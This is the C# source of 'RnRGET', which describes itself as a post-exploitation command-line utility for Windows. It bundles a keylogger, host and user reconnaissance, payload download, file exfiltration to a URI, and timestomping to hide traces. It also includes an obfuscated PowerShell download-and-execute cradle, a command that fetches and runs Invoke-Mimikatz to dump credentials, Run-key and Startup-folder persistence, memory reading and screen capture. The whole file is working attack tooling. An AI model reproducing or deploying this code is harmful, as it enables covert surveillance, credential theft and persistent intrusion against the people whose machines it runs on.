using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using Microsoft.Win32;

namespace rnr
{

    public class Keylogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        private System.String keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private System.Timers.Timer timerBufferFlush;
        private System.String hWndTitle;
        private System.String hWndTitlePast;
        public System.String LOG_FILE;
        public System.String LOG_MODE;
        public System.String LOG_OUT;
        private bool tglAlt = false;
        private bool tglControl = false;
        private bool tglCapslock = false;

        public Keylogger()
        {
            hWndTitle = ActiveApplTitle();
            hWndTitlePast = hWndTitle;

            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;

            // 
            // timerBufferFlush
            //
            this.timerBufferFlush = new System.Timers.Timer();
            this.timerBufferFlush.Enabled = true;
            this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
            this.timerBufferFlush.Interval = 1800000; // 30 minutes
        }

        static void keylog()
        {
            Keylogger kl = new Keylogger();
            kl.Enabled = true;
            Console.ReadLine();
            kl.Flush2File("test.txt");

        }

        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }

        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            hWndTitle = ActiveApplTitle();

            if (hWndTitle != hWndTitlePast)
            {
                if (LOG_OUT == "file")
                    keyBuffer += "[" + hWndTitle + "]";
                else
                {
                    Flush2Console("[" + hWndTitle + "]", true);
                    if (keyBuffer.Length > 0)
                        Flush2Console(keyBuffer, false);
                }
                hWndTitlePast = hWndTitle;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]


                    if (ControlKey)
                    {
                        if (!tglControl)
                        {
                            tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (tglControl)
                        {
                            tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!tglAlt)
                        {
                            tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (tglAlt)
                        {
                            tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!tglCapslock)
                        {
                            tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (tglCapslock)
                        {
                            tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<Win>";

                    /* ********************************************** *
                     * Detect key based off ShiftKey Toggle
                     * ********************************************** */
                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i;
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32);
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                    }
                }
            }
        }

        #region toggles
        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
        } // AltKey
        #endregion

        private void timerBufferFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (LOG_OUT == "file")
            {
                if (keyBuffer.Length > 0)
                    Flush2File(LOG_FILE);
            }
            else
            {
                if (keyBuffer.Length > 0)
                    Flush2Console(keyBuffer, false);
            }
        }

        public void Flush2Console(string data, bool writeLine)
        {
            if (writeLine)
                Console.WriteLine(data);
            else
            {
                Console.Write(data);
                keyBuffer = ""; // reset
            }
        }

        public void Flush2File(string file)
        {
            string AmPm = "";
            try
            {
                if (LOG_MODE == "hour")
                {
                    if (DateTime.Now.TimeOfDay.Hours >= 0 && DateTime.Now.TimeOfDay.Hours <= 11)
                        AmPm = "AM";
                    else
                        AmPm = "PM";
                    file += "_" + DateTime.Now.ToString("hh") + AmPm + ".log";
                }
                else
                    file += "_" + DateTime.Now.ToString("MM.dd.yyyy") + ".log";

                FileStream fil = new FileStream(file, FileMode.Append, FileAccess.Write);
                using (StreamWriter sw = new StreamWriter(fil))
                {
                    sw.Write(keyBuffer);
                }

                keyBuffer = ""; // reset
            }
            catch (Exception ex)
            {
                // Uncomment this to help debug.
                // Console.WriteLine(ex.Message);
                throw;
            }
        }

        #region Properties
        public System.Boolean Enabled
        {
            get
            {
                return timerKeyMine.Enabled && timerBufferFlush.Enabled;
            }
            set
            {
                timerKeyMine.Enabled = timerBufferFlush.Enabled = value;
            }
        }

        public System.Double FlushInterval
        {
            get
            {
                return timerBufferFlush.Interval;
            }
            set
            {
                timerBufferFlush.Interval = value;
            }
        }

        public System.Double MineInterval
        {
            get
            {
                return timerKeyMine.Interval;
            }
            set
            {
                timerKeyMine.Interval = value;
            }
            #endregion
        }

        class get
        {
            static void Main(string[] args)
            {
                if (args.Length == 0)
                {
                    Console.WriteLine("                                                     __     ");
                    Console.WriteLine("                                                    /  |    ");
                    Console.WriteLine("  ______   _______    ______    ______    ______   _$$ |_   ");
                    Console.WriteLine(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
                    Console.WriteLine("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
                    Console.WriteLine("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
                    Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
                    Console.WriteLine("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
                    Console.WriteLine("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
                    Console.WriteLine("                              /  \\__$$ |                    ");
                    Console.WriteLine("                              $$    $$/                     ");
                    Console.WriteLine("                               $$$$$$/                      ");
                    Console.WriteLine("\nlittle recon never hurt nobody......");
                    Console.WriteLine("\nRnRGET - post exploit commandline utility by james haughom jr\n");
                    help();
                    return;
                }
                // populate the variables from the arguments
                for (int i = 0; i < args.Length; i++)
                {
                    try
                    {
                        args[i].ToString();
                    }
                    catch
                    {
                        // Display error if input is missing or invalid
                        Console.WriteLine(Environment.NewLine + "Invalid Input" +
                        Environment.NewLine);
                        Console.ReadLine();
                        return;
                    }
                }
                if (args[0] == "help" || args[0] == "?" || args[0] == "/?")
                {
                    Console.WriteLine("");
                    help();
                }
                else if (args[0] == "hostinfo")
                {
                    hostinfo();
                }
                else if (args[0] == "userinfo")
                {
                    userinfo();
                }
                else if (args[0] == "shares")
                {
                    shares();
                }
                else if (args[0] == "ps")
                {
                    ps();
                }
                else if (args[0] == "envar")
                {
                    envar();
                }
                else if (args[0] == "dld")
                {
                    dld(args[1], args[2]);
                }
                else if (args[0] == "cat")
                {
                    cat(args[1]);
                }
                else if (args[0] == "xfil")
                {
                    xfil(args[1], args[2]);
                }
                else if (args[0] == "ts")
                {
                    ts(args[1]);
                }
                else if (args[0] == "mv")
                {
                    mv(args[1], args[2]);
                }
                else if (args[0] == "cp")
                {
                    cp(args[1], args[2]);
                }
                else if (args[0] == "del")
                {
                    del(args[1]);
                }
                else if (args[0] == "grep")
                {
                    grep(args[1], args[2]);
                }
                else if (args[0] == "enumdir")
                {
                    enumdir(args[1]);
                }
                else if (args[0] == "run")
                {
                    run(args[1]);
                }
                else if (args[0] == "mkdir")
                {
                    mkdir(args[1]);
                }
                else if (args[0] == "runadmin")
                {
                    runadmin(args[1]);
                }
                else if (args[0] == "dldstr")
                {
                    dldstr(args[1]);
                }
                else if (args[0] == "runps")
                {
                    runps(args[1]);
                }
                else if (args[0] == "keylog")
                {
                    keylog();
                }
                else if (args[0] == "arch")
                {
                    arch(args[1], args[2]);
                }
                else if (args[0] == "screencap")
                {
                    screencap(args[1]);
                }
                else if (args[0] == "readmem")
                {
                    readmem();
                }
                else if (args[0] == "mimi")
                {
                    mimikatz();
                }
                else if (args[0] == "persist")
                {
                    persist(args[1]);
                }
                else
                {
                    Console.WriteLine("\nCommand/Argument not recognized.......\n");
                    help();
                }
                return;
            }
            static void hostinfo()
            {
                string hostName = Dns.GetHostName();
                string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
                Console.Write("IP: {0}", ip);
                Console.Write("\nHostname: {0}", System.Environment.MachineName);
                Console.Write("\nMAC: ");
                string Query2 = "SELECT * FROM win32_networkadapterconfiguration";
                ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(Query2);
                var mac = "";
                foreach (ManagementObject nic in searcher2.Get())
                {
                    mac += Convert.ToString(nic.Properties["MACAddress"].Value);
                    if (mac.Length <= 17 && mac.Length != 0)
                    {
                        Console.Write("\n{0}", mac);
                    }

                }
                Console.Write("\nProcessor Count: {0}", System.Environment.ProcessorCount);
                Console.Write("\n64-bit: {0}", System.Environment.Is64BitOperatingSystem);
                Console.Write("\nLogical Drive: {0}", Environment.GetLogicalDrives());
                string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
                UInt64 Capacity = 0;
                foreach (ManagementObject WniPART in searcher.Get())
                {
                    Capacity += Convert.ToUInt64(WniPART.Properties["Capacity"].Value);
                }
                Console.Write("\nTotal RAM: {0}", Capacity);
                // add disk size
                // add OS version
            }
            static void userinfo()
            {
                Console.Write("Username: {0}", Environment.UserName);
                Console.Write("\nDomain\\Username: {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                    Console.Write("\nAdmin: " + admin);
                }
            }
            static void shares()
            {
                var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
                var wql = "select * FROM Win32_Share";
                var searcher = new ManagementObjectSearcher(wmiPath, wql);
                var shares = searcher.Get();
                Console.Write("\nShares:");
                foreach (var share in shares)
                {
                    Console.Write("\n{0}", share);
                }
                var wql2 = "select * FROM Win32_MappedLogicalDisk";
                var searcher2 = new ManagementObjectSearcher(wmiPath, wql2);
                var netShares = searcher2.Get();
                if (netShares is null)
                {
                    Console.Write("\nNo Mapped Drives!");
                }
                else
                {
                    Console.Write("\nMapped Drives:\n");
                    foreach (var share2 in netShares)
                    {
                        Console.Write("\n{0}");
                    }
                }
            }
            static void ps()
            {
                StringBuilder allProcesses = new StringBuilder();
                allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
                Process[] processList = Process.GetProcesses();
                foreach (Process process in processList)
                {
                    string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
                    allProcesses.Append(processInfo);
                }
                Console.Write(allProcesses.ToString());
            }
            static void envar()
            {
                var envar = Environment.GetEnvironmentVariables();
                foreach (DictionaryEntry i in envar)
                {
                    Console.WriteLine("{0}: {1}", i.Key, i.Value);
                }
            }
            static void dld(string path, string uri)
            {
                var wc = new System.Net.WebClient();
                wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
                Uri u = new Uri(uri);
                wc.DownloadFile(u, path);
            }
            static void cat(string path)
            {
                Console.Write(System.IO.File.ReadAllText(path));
            }
            static void xfil(string path, string uri)
            {
                var wc = new System.Net.WebClient();
                Uri u = new Uri(uri);
                wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
                wc.UploadFile(u, path);
            }
            static void ts(string path)
            {
                System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
                System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
                System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
            }
            static void mv(string src, string dest)
            {
                System.IO.File.Move(src, dest);
            }
            static void cp(string src, string dest)
            {
                System.IO.File.Copy(src, dest);
            }
            static void del(string path)
            {
                System.IO.File.Delete(path);
            }
            static void grep(string pattern, string path)
            {
                var lines = System.IO.File.ReadLines(path);
                foreach (string line in lines)
                {
                    if (line.Contains(pattern))
                    {
                        Console.WriteLine(line);
                    }
                }
            }
            static void enumdir(string path)
            {
                var files = System.IO.Directory.EnumerateFiles(path);
                var f = "";
                foreach (string file in files)
                {
                    f += "\n" + file;
                }
                var directories = System.IO.Directory.EnumerateDirectories(path);
                foreach (string directory in directories)
                {
                    f += "\n" + directory;
                }
                var list = f.Split();
                List<string> result = f.Split('\n').ToList();
                result.Sort();
                foreach (var item in result)
                {
                    Console.WriteLine(item);
                }
            }
            static void run(string proc)
            {
                Process.Start(proc);
            }
            static void mkdir(string dir)
            {
                System.IO.Directory.CreateDirectory(dir);
            }
            private static bool runadmin(string proc)
            {
                var SelfProc = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    WorkingDirectory = Environment.CurrentDirectory,
                    FileName = proc,
                    Verb = "runas",
                };
                try
                {
                    Process.Start(SelfProc);
                    return true;
                }
                catch
                {
                    Console.WriteLine("Insufficient privs.....");
                    return false;
                }
            }
            static void runps(string uri)
            {
                string s1 = "powershell.exe -noexit $asfkjas = (n`E`w-o`Bje`Ct \"n`eT.w`Ebcl`i`EnT\");$lkjd = $asfkjas.\"d`O`wnL`oa`dSTr`iNG\"(\"";
                string s2 = "\");$erl = ${env:ProgramFiles(x86)}[12] + ${env:ProgramFiles(x86)}[14] + ${env:ProgramFiles(x86)}[18];.$erl $lkjd";
                string payload = s1 + uri + s2;
                Console.Write(payload);
                string formatted = "\"\"\"" + payload + "\"\"\"";
                /*
                Process.Start("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", formatted);
                */
                Console.WriteLine(formatted);
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                startInfo.Arguments = payload;
                Process.Start(formatted);

            }
            static void dldstr(string uri)
            {
                var wc = new System.Net.WebClient();
                wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
                Uri u = new Uri(uri);
                string payload = wc.DownloadString(u);
            }
            static void arch(string src, string dest)
            {
                System.IO.Compression.ZipFile.CreateFromDirectory(src, dest);
            }
            static void screencap(string dest)
            {
                Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(screencap as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, screencap.Size);
                screencap.Save(dest, ImageFormat.Jpeg);
            }
            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport("kernel32.dll")]
            public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
            const int PROCESS_WM_READ = 0x0010;

            static void readmem()
            {
                Process process = Process.GetProcessesByName("notepad")[0];
                IntPtr processHandle = OpenProcess(PROCESS_WM_READ, false, process.Id);

                int bytesRead = 0;
                byte[] buffer = new byte[24];
                ReadProcessMemory((int)processHandle, 0x0, buffer, buffer.Length, ref bytesRead);
                Console.WriteLine(Encoding.Unicode.GetString(buffer) + " (" + bytesRead.ToString() + "bytes)");
                Console.ReadLine();
            }
            static void mimikatz()
            {
                string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
                ProcessStartInfo psinfo = new ProcessStartInfo("powershell.exe");
                psinfo.WindowStyle = ProcessWindowStyle.Normal;
                psinfo.Arguments = args;
                Process.Start(psinfo);
            }
            static void persist(string s)
            {
                if (s == "runkey")
                {
                    // copy file to temp dir and set reg value
                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rnrget", "C:\\Windows\\System32\\calc.exe");
                }
                else if (s == "logonscript")
                {
                    var startup = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
                    var split = Environment.CommandLine.Split();
                    File.Copy(split[0], startup);
                }
            }
    
            static void help()
            {
                Console.WriteLine("Command      Description                 Format");
                Console.WriteLine("-------      -----------                 ------");
                Console.WriteLine("help         display help menu           rnrget.exe help, rnrget.exe /?, rnrget.exe ?");
                Console.WriteLine("arch         create zip file from dir    rnrget.exe arch <source path> <destination path>, rnrget.exe arch C:\\Users\\srcdir C:\\Users\\dest.zip");
                Console.WriteLine("cp           copy files                  rnrget.exe cp <source path> <destination path>, rnrget.exe cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
                Console.WriteLine("del          delete files                rnrget.exe del <target path>, rnrget.exe del C:\\Users\\Admin\\targetfile.txt");
                Console.WriteLine("dld          download payloads           rnrget.exe dld <download path> <URI>, rnrget.exe dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
                Console.WriteLine("enumdir      enumerate files             rnrget.exe enumdir <target dir>, rnrget.exe enumdir C:\\Users\\Admin\\Desktop");
                Console.WriteLine("grep         case sensisitive grep       rnrget.exe grep <pattern> <path>, rnrget.exe grep foo bar.txt");
                Console.WriteLine("hostinfo     get host information        rnrget.exe hostinfo");
                Console.WriteLine("keylog       log key strokes             rnrget.exe keylog");
                Console.WriteLine("mimikatz     invoke-mimikatz             rnrget.exe mimikatz");
                Console.WriteLine("mv           move files                  rnrget.exe mv <source> <destination>, rnrget.exe mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
                Console.WriteLine("mkdir        create directory            rnrget.exe mkdir <target dir>, rnrget.exe mkdir C:\\Users\\Admin\\NewDir");
                Console.WriteLine("persist      persist across reboots      rnrget.exe persist <runkey or logonscript or startup folder, rnrget.exe persist runkey");
                Console.WriteLine("ps           get process listing         rnrget.exe ps");
                Console.WriteLine("cat          read text from file         rnrget.exe cat <target path>, rnrget.exe cat C:\\Users\\Admin\\helloworld.txt");
                Console.WriteLine("run          run processes               rnrget.exe run <target path>, rnrget.exe run calc.exe");
                Console.WriteLine("runadmin     run processes as admin      rnrget.exe runadmin <target path>, runadmin calc.exe");
                Console.WriteLine("screencap    take screenshot             rnrget.exe screencap <save path>, rnrget.exe screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
                Console.WriteLine("shares       enumerate shares            rnrget.exe shares");
                Console.WriteLine("ts           timestomp                   rnrget.exe ts <target path>, rnrget.exe ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
                Console.WriteLine("userinfo     get user information        rnrget.exe userinfo");
                Console.WriteLine("xfil         exfil files                 rnrget.exe xfil <target path> <URI>, rnrget.exe xfil C:\\Users\\Admin\\xfil.me https://raw.githubusercontent.com/rnranalysis/xfiol.file");
                Console.WriteLine("");
            }
        }
    }
}
